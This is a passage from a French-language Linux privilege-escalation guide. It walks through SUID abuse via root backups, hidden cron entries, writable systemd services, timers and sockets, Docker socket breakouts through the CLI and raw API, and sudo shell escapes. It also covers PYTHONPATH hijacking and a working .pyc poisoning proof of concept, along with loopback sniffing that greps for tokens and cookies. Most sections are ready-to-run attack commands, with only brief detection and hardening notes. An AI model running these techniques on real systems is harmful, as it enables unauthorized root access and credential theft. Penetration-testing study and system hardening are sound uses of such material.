Exploit :

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Cela fonctionne parce que `pg_basebackup` préserve les bits de mode des fichiers lors de la copie du cluster ; lorsqu’il est exécuté par root, les fichiers de destination héritent de la **propriété root + des SUID/SGID choisis par l’attaquant**. Toute routine de sauvegarde/copie privilégiée similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Tâches cron invisibles

Il est possible de créer une tâche cron **en plaçant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Pour détecter ce type d’entrée furtive, inspectez les fichiers cron avec des outils qui affichent les caractères de contrôle :

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Services

### Fichiers _.service_ modifiables en écriture

Vérifiez si vous pouvez écrire dans un fichier `.service`. Si c’est le cas, vous **pourriez le modifier** pour qu’il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre le redémarrage de la machine).\
Par exemple, créez votre backdoor dans le fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de service modifiables en écriture

N’oubliez pas que si vous disposez des **permissions en écriture sur les binaires exécutés par les services**, vous pouvez les remplacer par des backdoors afin que celles-ci soient exécutées lorsque les services seront relancés.

### PATH de systemd - Chemins relatifs

Vous pouvez consulter le PATH utilisé par **systemd** avec :

```bash
systemctl show-environment
```

Si vous constatez que vous pouvez **écrire** dans l’un des dossiers du chemin, vous pourrez peut-être **élever vos privilèges**. Vous devez rechercher les **chemins relatifs utilisés dans les fichiers de configuration des services**, comme :

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ensuite, créez un **exécutable** portant le **même nom que le binaire du chemin relatif** dans le dossier PATH de systemd où vous avez les droits d’écriture. Lorsque le service est invité à exécuter l’action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer ni arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**Pour en savoir plus sur les services, consultez `man systemd.service`.**

## **Minuteries**

Les **minuteries** sont des fichiers d’unité systemd dont le nom se termine par `**.timer**` et qui contrôlent des fichiers `**.service**` ou des événements. Les **minuteries** peuvent remplacer cron, car elles prennent en charge les événements calendaires et les événements monotones, et peuvent s’exécuter de manière asynchrone.

Vous pouvez énumérer toutes les minuteries avec :

```bash
systemctl list-timers --all
```

### Minuteries modifiables

Si vous pouvez modifier une minuterie, vous pouvez lui faire exécuter des unités systemd.unit existantes (comme un `.service` ou un `.target`).

```bash
Unit=backdoor.service
```

Dans la documentation, vous pouvez lire ce qu’est une unité :

> L’unité à activer lorsque ce timer arrive à échéance. L’argument est un nom d’unité, dont le suffixe n’est pas « .timer ». Si cette valeur n’est pas spécifiée, elle correspond par défaut à un service portant le même nom que l’unité timer, à l’exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l’unité activée et celui de l’unité timer soient identiques, à l’exception du suffixe.

Par conséquent, pour abuser de cette permission, vous devez :

- Trouver une unité systemd (comme un `.service`) qui **exécute un binaire modifiable**
- Trouver une unité systemd qui **exécute un chemin relatif** et sur lequel vous avez des **droits d’écriture dans le PATH systemd** (pour usurper l’identité de cet exécutable)

**Pour en savoir plus sur les timers, consultez `man systemd.timer`.**

### **Activation du timer**

Pour activer un timer, vous devez disposer des privilèges root et exécuter :

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Notez que le **timer** est **activé** en créant un lien symbolique vers celui-ci dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur une même machine ou sur des machines différentes dans le cadre de modèles client-serveur. Ils utilisent des fichiers de descripteur Unix standard pour la communication entre ordinateurs et sont configurés au moyen de fichiers `.socket`.<sup>[[14]](#references)</sup>

Les sockets peuvent être configurés à l’aide de fichiers `.socket`.

**Pour en savoir plus sur les sockets, consultez `man systemd.socket`.** Plusieurs paramètres intéressants peuvent être configurés dans ce fichier :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : Ces options sont différentes, mais permettent toutes d’**indiquer où le socket va écouter** (le chemin du fichier de socket AF_UNIX, l’adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
- `Accept` : Accepte un argument booléen. Si la valeur est **true**, une **instance de service est lancée pour chaque connexion entrante** et seul le socket de connexion lui est transmis. Si la valeur est **false**, tous les sockets en écoute sont **transmis à l’unité de service démarrée**, et une seule unité de service est lancée pour toutes les connexions. Cette valeur est ignorée pour les sockets datagram et les FIFO, où une seule unité de service gère systématiquement tout le trafic entrant. **La valeur par défaut est false**. Pour des raisons de performance, il est recommandé de n’écrire de nouveaux daemons que de manière à ce qu’ils soient compatibles avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost` : Acceptent une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la création et la liaison des **sockets**/FIFO en écoute, respectivement. Le premier élément de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
- `ExecStopPre`, `ExecStopPost` : Commandes supplémentaires qui sont **exécutées avant** ou **après** la fermeture et la suppression des **sockets**/FIFO en écoute, respectivement.
- `Service` : Indique le nom de l’unité de **service à activer** lors de la réception de **trafic entrant**. Ce paramètre n’est autorisé que pour les sockets avec `Accept=no`. Par défaut, il s’agit du service portant le même nom que le socket (avec le suffixe remplacé). Dans la plupart des cas, il n’est pas nécessaire d’utiliser cette option.

### Fichiers .socket accessibles en écriture

Si vous trouvez un fichier `.socket` **accessible en écriture**, vous pouvez **ajouter** au début de la section `[Socket]` une ligne comme : `ExecStartPre=/home/kali/sys/backdoor` ; la backdoor sera alors exécutée avant la création du socket. Vous devrez donc **probablement attendre le redémarrage de la machine.**\
_Notez que le système doit utiliser la configuration de ce fichier socket, sinon la backdoor ne sera pas exécutée_

### Activation de socket + chemin d’unité accessible en écriture (création d’un service manquant)

Une autre mauvaise configuration à fort impact est la suivante :

- une unité de socket avec `Accept=no` et `Service=<name>.service`
- l’unité de service référencée est absente
- un attaquant peut écrire dans `/etc/systemd/system` (ou dans un autre chemin de recherche des unités)

Dans ce cas, l’attaquant peut créer `<name>.service`, puis déclencher du trafic vers le socket afin que systemd charge et exécute le nouveau service en tant que root.

Déroulement rapide :

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Sockets accessibles en écriture

Si vous **identifiez un socket accessible en écriture** (_nous parlons ici de sockets Unix, et non des fichiers de configuration `.socket`_), vous pouvez **communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer les sockets Unix

```bash
netstat -a -p --unix
```

### Connexion brute

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exemple d’exploitation :**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Notez qu’il peut y avoir des **sockets à l’écoute de requêtes HTTP** (_je ne parle pas des fichiers .socket, mais des fichiers qui jouent le rôle de sockets Unix_). Vous pouvez vérifier cela avec :

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Si le socket **répond à une requête HTTP**, vous pouvez alors **communiquer** avec lui et peut-être **exploiter une vulnérabilité**.

### Socket Docker accessible en écriture

Le socket Docker, souvent situé dans `/var/run/docker.sock`, est un fichier critique qui doit être protégé. Par défaut, il est accessible en écriture par l’utilisateur `root` et les membres du groupe `docker`. L’accès en écriture à ce socket peut entraîner une élévation de privilèges. Voici comment procéder, ainsi que des méthodes alternatives si la CLI Docker n’est pas disponible.

#### **Élévation de privilèges avec la CLI Docker**

Si vous avez accès en écriture au socket Docker, vous pouvez élever vos privilèges à l’aide des commandes suivantes :<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ces commandes vous permettent d’exécuter un conteneur avec un accès root au système de fichiers de l’hôte.

#### **Utilisation directe de l’API Docker**

Lorsque la CLI Docker n’est pas disponible, il est tout de même possible d’abuser du socket Docker en utilisant HTTP brut sur le socket Unix. La méthode la plus fiable consiste à :

- créer un conteneur auxiliaire à longue durée de vie avec le répertoire racine de l’hôte monté en bind
- le démarrer
- créer une instance `exec` dans ce conteneur auxiliaire
- démarrer l’instance `exec` et récupérer la sortie via l’API

**Lister les images Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Créer et démarrer un conteneur auxiliaire**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Créer une instance exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Démarrez l’instance exec et lisez la sortie**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ce modèle est généralement plus robuste que d’essayer de piloter manuellement `attach` avec `socat` ou `nc -U`. Une fois que vous pouvez créer un helper avec `/:/host`, vous pouvez utiliser des instances supplémentaires de `exec` pour lire des fichiers tels que `/host/root/...`, ajouter des clés SSH sous `/host/root/.ssh` ou modifier les fichiers de démarrage de l’hôte.

### Autres

Notez que si vous avez des permissions d’écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous avez [**d’autres moyens d’élever vos privilèges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si [**l’API Docker écoute sur un port**, vous pouvez également la compromettre](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Découvrez **d’autres moyens de sortir des conteneurs ou d’abuser des runtimes de conteneurs pour élever vos privilèges** dans :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Élévation de privilèges avec Containerd (ctr)

Si vous découvrez que vous pouvez utiliser la commande **`ctr`**, consultez la page suivante, car **vous pourrez peut-être l’exploiter pour élever vos privilèges** :


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Élévation de privilèges avec **RunC**

Si vous découvrez que vous pouvez utiliser la commande **`runc`**, consultez la page suivante, car **vous pourrez peut-être l’exploiter pour élever vos privilèges** :


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un système sophistiqué de **communication interprocessus (IPC)** qui permet aux applications d’interagir et de partager des données efficacement. Conçu pour les systèmes Linux modernes, il offre un framework robuste pour différentes formes de communication entre applications.<sup>[[16]](#references)</sup>

Polyvalent, le système prend en charge les IPC de base, qui améliorent l’échange de données entre les processus, à l’image des **sockets de domaine UNIX améliorés**. Il permet également de diffuser des événements ou des signaux, favorisant ainsi une intégration fluide entre les composants du système. Par exemple, un signal d’un daemon Bluetooth indiquant un appel entrant peut inciter un lecteur de musique à se mettre en sourdine, améliorant ainsi l’expérience utilisateur. De plus, D-Bus prend en charge un système d’objets distants, ce qui simplifie les demandes de service et les invocations de méthodes entre les applications, rationalisant des processus traditionnellement complexes.

D-Bus fonctionne selon un **modèle d’autorisation/refus**, en gérant les permissions des messages (appels de méthodes, émissions de signaux, etc.) en fonction de l’effet cumulé des règles de stratégie correspondantes. Ces stratégies définissent les interactions avec le bus et peuvent permettre une élévation de privilèges par l’exploitation de ces permissions.

Voici un exemple de stratégie dans `/etc/dbus-1/system.d/wpa_supplicant.conf`, qui détaille les permissions permettant à l’utilisateur root de posséder `fi.w1.wpa_supplicant1`, de lui envoyer des messages et d’en recevoir.

Les stratégies pour lesquelles aucun utilisateur ni groupe n’est spécifié s’appliquent à tous, tandis que les stratégies du contexte « default » s’appliquent à tous ceux qui ne sont pas couverts par d’autres stratégies spécifiques.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Apprenez à énumérer et exploiter une communication D-Bus ici :**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d’énumérer le réseau et de déterminer la position de la machine.

### Énumération générique

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Si une entrée active dans `/etc/inetd.conf` exécute GNU Inetutils `telnetd` en tant que root, vérifiez la version du binaire configuré ainsi que le listener local, même si le port est lié uniquement à l’interface loopback. GNU Inetutils 1.9.3 à 2.7 présentait un [contournement de l’authentification Telnet](https://seclists.org/oss-sec/2026/q1/89) par lequel le `USER` fourni par le client était transmis à `login -f` (CVE-2026-24061). La présence d’un processus ou d’une chaîne de version est un indicateur ; vérifiez l’état des correctifs du fournisseur et le daemon réellement utilisé avant de considérer le système comme exposé. Le [guide Telnet](../../../network-services-pentesting/pentesting-telnet.md) fournit davantage de détails.

### Triage rapide du filtrage sortant

Si l’hôte peut exécuter des commandes, mais que les callbacks échouent, distinguez rapidement le filtrage DNS, transport, proxy et routage :

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Ports ouverts

Vérifiez toujours les services réseau exécutés sur la machine avec lesquels vous n’avez pas pu interagir avant d’y accéder :

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Classifiez les listeners selon leur adresse d’écoute :

- `0.0.0.0` / `[::]` : exposés sur toutes les interfaces locales.
- `127.0.0.1` / `::1` : accessibles uniquement en local (bons candidats pour un tunnel/forward).
- Adresses IP internes spécifiques (p. ex. `10.x`, `172.16/12`, `192.168.x`, `fe80::`) : généralement accessibles uniquement depuis les segments internes.

### Workflow de triage des services accessibles uniquement en local

Lorsque vous compromettez un hôte, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Voici un workflow local rapide :

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS comme scanner réseau (mode réseau uniquement)

En plus des vérifications locales d’élévation de privilèges, linPEAS peut fonctionner comme scanner réseau dédié. Il utilise les binaires disponibles dans `$PATH` (généralement `fping`, `ping`, `nc`, `ncat`) et n’installe aucun outil.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Si vous passez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un scanner réseau pur (en ignorant le reste des vérifications d’élévation de privilèges).

### Sniffing

Vérifiez si vous pouvez sniffer le trafic. Si c’est le cas, vous pourriez récupérer des identifiants.

```
timeout 1 tcpdump
```

Vérifications pratiques rapides :

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) est particulièrement précieux en post-exploitation, car de nombreux services accessibles uniquement en interne y exposent des tokens/cookies/identifiants :

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Capturez maintenant, analysez plus tard :

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont présents sur les systèmes, lesquels peuvent se **login** et lesquels ont des **privilèges root** :

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### UID élevé

Certaines versions de Linux étaient affectées par un bug permettant aux utilisateurs avec un **UID > INT_MAX** d’élever leurs privilèges. Plus d’infos : [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploitez-le** avec : **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d’un groupe** susceptible de vous accorder des privilèges root :


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d’intéressant se trouve dans le presse-papiers (si possible)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Politique de mots de passe

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Mots de passe connus

Si vous **connaissez un mot de passe** de l’environnement, **essayez de vous connecter en tant que chaque utilisateur** avec ce mot de passe.

### Su Brute

Si faire beaucoup de bruit ne vous dérange pas et que les binaires `su` et `timeout` sont présents sur l’ordinateur, vous pouvez essayer de brute-force un utilisateur avec [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de brute-force les utilisateurs.

## Abus du PATH modifiable

### $PATH

Si vous découvrez que vous pouvez **écrire dans un dossier du $PATH**, vous pourrez peut-être élever vos privilèges en **créant une backdoor dans le dossier modifiable**, portant le nom d’une commande qui sera exécutée par un autre utilisateur (idéalement root) et qui **n’est pas chargée depuis un dossier situé avant votre dossier modifiable dans le $PATH**.

### SUDO et SUID

Vous pourriez être autorisé à exécuter une commande avec sudo, ou celle-ci pourrait avoir le bit suid. Vérifiez-le avec :

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Certaines **commandes inattendues permettent de lire et/ou d’écrire des fichiers, voire d’exécuter une commande**.<sup>[[8]](#references)</sup> Par exemple :

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

La configuration de sudo peut permettre à un utilisateur d’exécuter certaines commandes avec les privilèges d’un autre utilisateur sans connaître son mot de passe.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Dans cet exemple, l’utilisateur `demo` peut exécuter `vim` en tant que `root` ; il est alors facile d’obtenir un shell en ajoutant une clé SSH dans le répertoire de `root` ou en appelant `sh`.

```
sudo vim -c '!sh'
```

### Comparaison Bash sans guillemets dans un script sudo

Dans Bash, le côté droit de `[[ "$protected" == $candidate ]]` est un motif. Si un script sudo pouvant s’exécuter en tant que root récupère `candidate` depuis un fichier contrôlé par l’appelant, une valeur telle que `prefix*` peut correspondre au début d’une chaîne protégée. Des chemins de réussite et d’erreur différents peuvent alors révéler un préfixe via un oracle. Mettez le côté droit entre guillemets (`[[ "$protected" == "$candidate" ]]`) lorsque l’égalité littérale est souhaitée. Examinez les arguments sudo effectifs, la provenance des entrées et le comportement observable des branches avant de considérer qu’une comparaison sans guillemets est exploitable. Le [manuel GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) décrit ce comportement des motifs.

### Fichiers de projet PrusaSlicer exécutés avec sudo

Une autorisation sudo sans restriction permettant d’exécuter `prusaslicer` ou `prusa-slicer` en tant que root mérite d’être examinée si l’appelant peut choisir le projet `.3mf` à découper. Un projet peut contenir un script de post-traitement exécuté lors de l’export du G-code ; des projets conçus à cet effet pourraient exécuter des commandes dans PrusaSlicer jusqu’à la version 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Vérifiez la règle sudo effective, la version du binaire et les correctifs du fournisseur, la provenance du projet et si le chemin d’export concerné est exécuté avant de conclure que la frontière de privilèges peut être franchie. Un argument de projet fixe ou une règle `NOEXEC` effective peut changer le résultat. La simple présence du slicer ne suffit pas à établir un chemin d’escalade de privilèges.

### SETENV

Cette directive permet à l’utilisateur de **définir une variable d’environnement** lors de l’exécution d’une commande :

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **PYTHONPATH hijacking**, qui permettait de charger une bibliothèque Python arbitraire lors de l’exécution du script en tant que root :

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Empoisonnement de `__pycache__` / `.pyc` inscriptible dans les imports Python autorisés par sudo

Si un **script Python autorisé par sudo** importe un module dont le répertoire de package contient un **`__pycache__` inscriptible**, vous pourrez peut-être remplacer le `.pyc` mis en cache et exécuter du code en tant qu'utilisateur privilégié lors du prochain import.<sup>[[30]](#references)</sup>

- Pourquoi ça fonctionne :
  - CPython stocke les caches de bytecode dans `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - L'interpréteur valide l'**en-tête** (magic + métadonnées d'horodatage/hash liées à la source), puis exécute l'objet code marshalé stocké après cet en-tête.
  - Si vous pouvez **supprimer et recréer** le fichier mis en cache parce que le répertoire est inscriptible, un fichier `.pyc` appartenant à root mais non inscriptible peut tout de même être remplacé.
- Schéma typique :
  - `sudo -l` affiche un script ou wrapper Python que vous pouvez exécuter en tant que root.
  - Ce script importe un module local depuis `/opt/app/`, `/usr/local/lib/...`, etc.
  - Le répertoire `__pycache__` du module importé est inscriptible par votre utilisateur ou par tout le monde.

Énumération rapide :

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Si vous pouvez inspecter le script privilégié, identifiez les modules importés et leur chemin de cache :<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Procédure d’exploitation :

1. Exécutez une fois le script autorisé via sudo afin que Python crée le fichier cache légitime s’il n’existe pas déjà.
2. Lisez les 16 premiers octets du fichier `.pyc` légitime et réutilisez-les dans le fichier empoisonné.
3. Compilez un objet code payload, appliquez-lui `marshal.dumps(...)`, supprimez le fichier cache d’origine et recréez-le avec l’en-tête d’origine suivi de votre bytecode malveillant.
4. Réexécutez le script autorisé via sudo afin que l’import exécute votre payload en tant que root.

Remarques importantes :

- Réutiliser l’en-tête d’origine est essentiel, car Python vérifie les métadonnées du cache par rapport au fichier source, et non si le corps du bytecode correspond réellement au code source.
- Cette technique est particulièrement utile lorsque le fichier source appartient à root et n’est pas accessible en écriture, mais que le répertoire `__pycache__` qui le contient l’est.
- `PYTHONDONTWRITEBYTECODE=1` et `python -B` empêchent Python d’écrire de nouveaux fichiers `.pyc` ; ils ne l’empêchent **pas** de charger un cache déjà valide remplacé par un attaquant. Le point critique est de savoir si un utilisateur moins privilégié peut remplacer un cache que l’import privilégié acceptera. Avant de charger le bytecode mis en cache, Python vérifie les métadonnées d’horodatage/taille ou de hachage. Consultez la [référence sur les imports Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) et la [documentation de la ligne de commande](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Structure minimale de la preuve de concept :

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Renforcement :

- Assurez-vous qu’aucun répertoire du chemin d’importation Python privilégié n’est accessible en écriture aux utilisateurs peu privilégiés, y compris `__pycache__`.
- Vérifiez la propriété et les permissions des répertoires de cache, ainsi que celles des fichiers `.pyc` existants. Désactiver l’écriture des bytecode peut réduire la création de nouveaux caches, mais ne neutralise pas un cache existant qui peut être remplacé.
- Traitez les modules Python locaux accessibles en écriture et les répertoires de cache accessibles en écriture comme des scripts shell ou des bibliothèques partagées accessibles en écriture et exécutés par root.

### BASH_ENV préservé via sudo env_keep → shell root

Si sudoers préserve `BASH_ENV` (par exemple, `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage de Bash non interactif pour exécuter du code arbitraire en tant que root lors de l’exécution d’une commande autorisée.<sup>[[24]](#references)</sup>

